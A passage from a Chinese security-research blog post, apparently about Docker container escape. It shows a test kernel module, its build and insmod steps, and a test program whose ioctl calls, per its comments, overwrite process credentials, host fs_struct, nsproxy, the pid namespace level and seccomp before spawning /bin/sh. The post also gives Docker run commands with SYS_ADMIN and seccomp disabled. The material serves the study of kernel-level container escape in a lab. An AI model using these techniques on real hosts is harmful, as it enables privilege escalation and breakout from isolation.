rgb(0, 0, 159);">if</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain"> v2 </span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">return</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">                </span><span class="token function" style="color: rgb(215, 58, 73);">printk</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">"create device failed"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">                </span><span class="token function" style="color: rgb(215, 58, 73);">class_destroy</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">hellodev_class</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">            </span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token keyword" style="color: rgb(0, 0, 159);">else</span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">                </span><span class="token function" style="color: rgb(215, 58, 73);">printk</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">"create class failed"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">            </span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">            </span><span class="token function" style="color: rgb(215, 58, 73);">cdev_del</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">&amp;</span><span class="token plain">cdev_0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        </span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">else</span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">            </span><span class="token function" style="color: rgb(215, 58, 73);">printk</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">"cdev init failed"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        </span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        </span><span class="token function" style="color: rgb(215, 58, 73);">unregister_chrdev_region</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">hellodev_no</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">1</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        </span><span class="token keyword" style="color: rgb(0, 0, 159);">return</span><span class="token plain"> v1</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token function" style="color: rgb(215, 58, 73);">printk</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">"alloc_chrdev_region failed"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">return</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">1</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">static</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">void</span><span class="token plain"> __exit </span><span class="token function" style="color: rgb(215, 58, 73);">exit_function</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token keyword" style="color: rgb(0, 0, 159);">void</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token function" style="color: rgb(215, 58, 73);">printk</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">"bye bye~\\n"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token function" style="color: rgb(215, 58, 73);">device_destroy</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">hellodev_class</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> hellodev_no</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"> </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token function" style="color: rgb(215, 58, 73);">class_destroy</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">hellodev_class</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token function" style="color: rgb(215, 58, 73);">cdev_del</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">&amp;</span><span class="token plain">cdev_0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token function" style="color: rgb(215, 58, 73);">unregister_chrdev_region</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">hellodev_no</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">1</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token function" style="color: rgb(215, 58, 73);">module_init</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">init_function</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token function" style="color: rgb(215, 58, 73);">module_exit</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">exit_function</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token function" style="color: rgb(215, 58, 73);">MODULE_LICENSE</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">"GPL"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token function" style="color: rgb(215, 58, 73);">MODULE_AUTHOR</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">"bling"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token function" style="color: rgb(215, 58, 73);">MODULE_DESCRIPTION</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">"testdriver"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" class="clean-btn" aria-label="切换自动换行" title="切换自动换行"><svg viewBox="0 0 24 24" class="wordWrapButtonIcon_Bwma" aria-hidden="true"><path fill="currentColor" d="M4 19h6v-2H4v2zM20 5H4v2h16V5zm-3 6H4v2h13.25c1.1 0 2 .9 2 2s-.9 2-2 2H15v-2l-3 3l3 3v-2h2c2.21 0 4-1.79 4-4s-1.79-4-4-4z"></path></svg></button><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Makefile文件如下：</p>
<div class="language-css codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-css codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token property" style="color: rgb(54, 172, 170);">KDIR</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">:</span><span class="token plain">= /lib/modules/$</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">shell uname -r</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain">/build</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">obj-m += hello.o</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token property" style="color: rgb(54, 172, 170);">all</span><span class="token punctuation" style="color: rgb(57, 58, 52);">:</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">make -C $</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">KDIR</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"> M=$</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">shell pwd</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"> modules</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token property" style="color: rgb(54, 172, 170);">clean</span><span class="token punctuation" style="color: rgb(57, 58, 52);">:</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">make -C $</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">KDIR</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"> M=$</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">shell pwd</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"> clean</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>编译并安装到系统中：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">make</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">sudo insmod hello.ko</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
</ul>
<h3 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="74-测试程序">7.4 测试程序<a href="https://tiangonglab.github.io/blog/tiangongarticle030#74-%E6%B5%8B%E8%AF%95%E7%A8%8B%E5%BA%8F" class="hash-link" aria-label="7.4 测试程序的直接链接" title="7.4 测试程序的直接链接">​</a></h3>
<ul>
<li>
<p>测试程序源码如下：</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// test.c</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token macro property directive-hash" style="color: rgb(54, 172, 170);">#</span><span class="token macro property directive keyword" style="color: rgb(0, 0, 159);">include</span><span class="token macro property" style="color: rgb(54, 172, 170);"> </span><span class="token macro property string" style="color: rgb(227, 17, 108);">&lt;stdio.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">int</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">main</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">char</span><span class="token plain"> buf</span><span class="token punctuation" style="color: rgb(57, 58, 52);">[</span><span class="token number" style="color: rgb(54, 172, 170);">100</span><span class="token punctuation" style="color: rgb(57, 58, 52);">]</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token function" style="color: rgb(215, 58, 73);">printf</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">"pid: %d\n"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token function" style="color: rgb(215, 58, 73);">getpid</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">int</span><span class="token plain"> fd </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">open</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">"/dev/hellodev"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token number" style="color: rgb(54, 172, 170);">2</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">if</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">fd </span><span class="token operator" style="color: rgb(57, 58, 52);">&lt;=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token function" style="color: rgb(215, 58, 73);">printf</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">"fd: %d error, %d \n"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain">fd</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> errno</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token function" style="color: rgb(215, 58, 73);">exit</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">-</span><span class="token number" style="color: rgb(54, 172, 170);">1</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">/* 组合不同的ioctl分支来调试 */</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token function" style="color: rgb(215, 58, 73);">ioctl</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">fd</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0x1000</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">   </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// 更改当前进程 cred</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// ioctl(fd, 0x1001, 0);  // 更改当前进程 fs_struct，使其指向 host pid-1 的 fs_struct</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// ioctl(fd, 0x1002, 0);  // 更改 Docker pid-1 的 nsproxy 指向 init_nsproxy</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// ioctl(fd, 0x1003, 0);  // 更改当前进程 pid namespace 的 level 值，改成0</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// ioctl(fd, 0x1004, 0);  // 更改当前进程 seccomp 的开关，改成关闭状态</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// ioctl(fd, 0x1005, 0);  // 更改父进程的 cred</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">char</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">args</span><span class="token punctuation" style="color: rgb(57, 58, 52);">[</span><span class="token punctuation" style="color: rgb(57, 58, 52);">]</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token string" style="color: rgb(227, 17, 108);">"/bin/sh"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token constant" style="color: rgb(54, 172, 170);">NULL</span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token function" style="color: rgb(215, 58, 73);">execve</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">"/bin/sh"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> args</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token constant" style="color: rgb(54, 172, 170);">NULL</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" class="clean-btn" aria-label="切换自动换行" title="切换自动换行"><svg viewBox="0 0 24 24" class="wordWrapButtonIcon_Bwma" aria-hidden="true"><path fill="currentColor" d="M4 19h6v-2H4v2zM20 5H4v2h16V5zm-3 6H4v2h13.25c1.1 0 2 .9 2 2s-.9 2-2 2H15v-2l-3 3l3 3v-2h2c2.21 0 4-1.79 4-4s-1.79-4-4-4z"></path></svg></button><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
<li>
<p>编译</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">gcc test.c -o test</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
</ul>
<h3 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="75-调试">7.5 调试<a href="https://tiangonglab.github.io/blog/tiangongarticle030#75-%E8%B0%83%E8%AF%95" class="hash-link" aria-label="7.5 调试的直接链接" title="7.5 调试的直接链接">​</a></h3>
<p>被调试机中：</p>
<ul>
<li>
<p>安装内核ko</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">sudo insmod hello.ko</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
<li>
<p>起Docker，三种不同的方式</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">Docker run --rm -it --device=/dev/hellodev:/dev/hellodev testDocker bash</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"># Docker run --rm -it --cap-add=SYS_ADMIN --device=/dev/hellodev:/dev/hellodev testDocker bash</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"># Docker run --rm -it --cap-add=SYS_ADMIN --security-opt="seccomp=unconfined" --device=/dev/hellodev:/dev/hellodev testDocker bash</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" class="clean-btn" aria-label="切换自动换行" title="切换自动换行"><svg viewBox="0 0 24 24" class="wordWrapButtonIcon_Bwma" aria-hidden="true"><path 